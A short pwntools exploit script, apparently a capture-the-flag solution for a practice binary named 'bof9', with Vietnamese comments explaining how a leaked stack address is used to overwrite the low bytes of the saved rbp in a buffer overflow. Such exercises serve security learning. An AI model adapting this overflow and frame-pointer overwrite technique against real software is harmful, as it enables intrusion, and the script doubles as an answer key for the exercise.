from pwn import *

exe = ELF('./bof9', checksec=False)
p = process('./bof9')
input()


p.recvuntil(b'user: ')
leak = int(p.recvline(),16)

user = leak - 0x30      #địa chỉ ta cần thực hiện
rbp = user + 0x20       # do rbp - 0x20 khi trở về, sẽ rbp sẽ thực hiện tại địa chỉ mới
                        #do đó để trở về địa chỉ ta cần, ta + 0x20 vào địa chỉ user và bỏ vào rbp

payload = p64(0x13371337)
payload += p64(0xDEADBEEF)
payload += p64(0xCAFEBABE)
payload += p64(0x21)
payload += p16(rbp & 0xffff)
#payload += p64(rbp)[0:2]

p.sendafter(b'Username: ', payload)
p.sendafter(b'Password: ', b'a')

print(leak)
p.interactive()
